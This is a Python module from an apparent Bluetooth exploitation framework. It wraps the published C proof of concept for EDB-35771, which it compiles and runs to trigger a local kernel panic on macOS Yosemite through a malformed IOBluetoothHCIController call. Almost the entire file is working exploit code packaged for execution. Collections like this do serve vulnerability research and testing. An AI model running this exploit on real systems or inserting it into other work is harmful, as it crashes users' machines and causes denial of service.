"""
BlueSploit Module: macOS DispatchHCICreateConnection IOMalloc Fail
EDB-ID: 35771  (Yosemite 10.10, @rpaleari & @joystick)

Original C PoC embedded verbatim; compiled and run at module execution time.
"""

from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import print_error, print_info, print_warning, Colors
from core.utils.c_runner import compile_and_run, find_compiler
from core.utils.iokit import is_macos


C_SOURCE = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <IOKit/IOKitLib.h>

#define SIZE 0x1000

struct BluetoothCall {
  uint64_t args[7];
  uint64_t sizes[7];
  uint64_t index;
};

int main(void) {
  io_service_t service =
    IOServiceGetMatchingService(kIOMasterPortDefault,
                                IOServiceMatching("IOBluetoothHCIController"));
  if (!service) return -1;
  io_connect_t port = (io_connect_t) 0;
  kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
  IOObjectRelease(service);
  if (kr != kIOReturnSuccess) return kr;
  printf(" [+] port: %d\n", port);

  struct BluetoothCall a;
  int i;
  for (i=0; i<7; i++) {
    a.args[i] = (uint64_t) calloc(SIZE, sizeof(char));
    a.sizes[i] = SIZE;
  }
  a.args[6]  = 0x0;
  a.sizes[6] = 0x80000041;
  a.index    = 0x06;

  kr = IOConnectCallMethod((mach_port_t) port, 0, NULL, 0,
                           (const void*) &a, 120,
                           NULL, NULL, NULL, NULL);
  printf("kr: %08x\n", kr);
  return IOServiceClose(port);
}
"""


class Module(DosModule):
    info = ModuleInfo(
        name="dos/macos_iobt_createconnection",
        description="macOS DispatchHCICreateConnection IOMalloc-fail panic (EDB-35771, native C)",
        author=["@rpaleari", "@joystick"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=["https://www.exploit-db.com/exploits/35771"],
    )

    def _setup_options(self) -> None:
        self.options = {}

    def run(self) -> bool:
        C = Colors
        print(f"\n  {C.RED}{'─'*55}{C.RESET}")
        print(f"  {C.BOLD}macOS DispatchHCICreateConnection (EDB-35771){C.RESET}")
        print(f"  {C.RED}{'─'*55}{C.RESET}")
        if not is_macos():
            print_error("macOS only")
            return False
        if not find_compiler():
            print_error("No C compiler, install Xcode CLI tools")
            return False
        print_warning("IOMalloc-fail null-deref, local kernel panic")

        rc, out, err = compile_and_run(
            C_SOURCE, "iobt_createconnection",
            ldflags=["-framework", "IOKit"],
        )
        if rc == -1:
            print_error(err.strip())
            return False
        print_info(out)
        if err.strip():
            print_warning(err.strip())
        self.add_result({"edb_id": 35771, "rc": rc})
        return rc == 0
